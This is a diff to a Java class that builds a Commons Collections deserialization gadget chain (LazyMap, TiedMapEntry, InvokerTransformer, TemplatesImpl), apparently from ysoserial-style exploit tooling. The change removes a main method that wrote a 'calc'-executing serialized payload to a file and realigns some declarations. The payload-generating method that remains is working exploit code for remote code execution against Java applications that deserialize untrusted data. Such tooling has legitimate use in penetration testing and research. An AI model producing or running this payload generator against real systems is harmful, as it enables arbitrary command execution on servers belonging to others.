@@ -8,18 +8,11 @@ import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
 import java.io.ByteArrayOutputStream;
-import java.io.FileOutputStream;
 import java.io.ObjectOutputStream;
 import java.util.HashMap;
 import java.util.Map;
 
 public class CommonsCollectionsK1 {
-    public static void main(String[] args) throws Exception {
-        byte[]           bytes = getBytes(PayloadType.command, "calc");
-        FileOutputStream fous  = new FileOutputStream("out2222.ser");
-        fous.write(bytes);
-        fous.close();
-    }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
         Object tpl = Gadgets.createTemplatesImpl(type, param);
@@ -27,9 +20,8 @@ public class CommonsCollectionsK1 {
         InvokerTransformer      transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
         HashMap<String, String> innerMap    = new HashMap<String, String>();
         Map                     m           = LazyMap.decorate(innerMap, transformer);
-
-        Map          outerMap = new HashMap();
-        TiedMapEntry tied     = new TiedMapEntry(m, tpl);
+        Map                     outerMap    = new HashMap();
+        TiedMapEntry            tied        = new TiedMapEntry(m, tpl);
         outerMap.put(tied, "t");
         // clear the inner map data, this is important
         innerMap.clear();
